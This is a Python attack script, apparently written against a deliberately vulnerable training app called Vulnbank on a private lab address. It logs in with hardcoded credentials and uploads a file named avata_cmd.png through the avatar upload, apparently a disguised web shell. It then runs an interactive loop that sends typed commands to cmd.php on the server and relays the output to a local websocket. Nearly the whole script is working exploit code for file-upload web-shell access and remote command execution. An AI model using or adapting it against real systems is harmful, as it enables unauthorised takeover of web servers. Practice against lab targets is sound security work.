import subprocess
import requests
import os
import urllib.request
import time
import websocket
import _thread
import json

s = requests.session()
#proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
#login
print ("######################################################")
print ("########### Auto Login to Vulnbank.com ##############")
print ("######################################################")

urlLogin = "http://192.168.243.133:80/vulnbank/online/api.php"
datalogin = {"type": "user", "action": "login", "username": "j.doe", "password": "password"}
login = s.post(urlLogin, data=datalogin)

from websocket import create_connection
ws = create_connection("ws://127.0.0.1:8080/ws")
conten1 = {'type':'message', 'msg':'Login Success'}
conten1 = json.dumps(conten1)
ws.send(conten1)


'''
print ("=======>Login Success")
print ("                                                     ")
print ("                                                     ")
print ("                                                     ")

#upload avata
print ("######################################################")
print ("################### Upload Avata ####################")
print ("######################################################")

'''

animation_sequence = "|/-\\"
for i in range(91):
        print(animation_sequence[i % len(animation_sequence)], end="\r")
        i = i + 10
        time.sleep(0.1)
        # Verify the change in idx variable
        print(f'   loading: {i}', end='\r')

cookies=login.cookies
url = 'http://192.168.243.133/vulnbank/online/api.php'
files = {'upload_avatar': open('avata_cmd.png', 'rb')}
r = requests.post(url, cookies=cookies, files=files)

conten2 = {'type':'message', 'msg':'Upload Avata Success'}
conten2 = json.dumps(conten2)
ws.send(conten2)

conten3 = {'msg':'Connect to Backdoor Success. You can action here'}
conten3 = json.dumps(conten3)
ws.send(conten3)


#print ("=======>Upload Avata Success")
#print ("Connect to Backdoor Success. You can action here")
#run backdoor

#r=requests.get('http://192.168.243.133/vulnbank/online/cmdShell.php?cmd=id')
while True:
	cmd=str(input("www-data@www-data: "))
	r=requests.get('http://192.168.243.133/vulnbank/online/cmd.php?cmd=' + cmd)
	showInfo = r.text
	
	info = {'msg':'========Information System========'}
	info = json.dumps(info)
	ws.send(info)
	
	conten4 = {'msg':showInfo}
	conten4 = json.dumps(conten4)
	ws.send(conten4)
	
result =  ws.recv()
ws.close()
	